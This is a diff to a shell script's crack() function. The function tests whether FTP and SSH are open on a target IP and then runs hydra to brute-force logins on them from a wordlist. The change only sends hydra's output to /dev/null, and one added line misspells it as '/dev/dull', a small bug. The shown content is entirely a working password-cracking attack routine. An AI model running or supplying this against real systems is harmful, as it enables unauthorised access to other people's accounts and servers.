@@ -32,15 +32,15 @@ crack()
     if [[ ! -z "$ftp_stat" && "$ssh_stat" ]]; then
        echo "FTP and SSH open"
        echo "cracking FTP and SSH password"
-       hydra -I -t 1 -L $wordlist -P $wordlist $ip ssh -o tmp_ssh_pass.txt 
-       hydra -I -t 1 -L $wordlist -P $wordlist $ip ftp -o tmp_ftp_pass.txt 
+       hydra -I -t 1 -L $wordlist -P $wordlist $ip ssh -o tmp_ssh_pass.txt > /dev/null 
+       hydra -I -t 1 -L $wordlist -P $wordlist $ip ftp -o tmp_ftp_pass.txt > /dev/null
       elif [ ! -z "$ftp_stat" ]; then
          echo "FTP is open"
-        hydra -I -t 1 -L $wordlist -P $wordlist $ip ftp -o tmp_ftp_pass.txt 
+        hydra -I -t 1 -L $wordlist -P $wordlist $ip ftp -o tmp_ftp_pass.txt > /dev/null
      
       elif [ ! -z "$ssh_stat" ]; then
          echo "SSH is open"
-        hydra -I -t 1 -L $wordlist -P $wordlist $ip ssh -o tmp_ssh_pass.txt 
+        hydra -I -t 1 -L $wordlist -P $wordlist $ip ssh -o tmp_ssh_pass.txt > /dev/dull
     else
        echo "FTP and SSH closed"
        exit
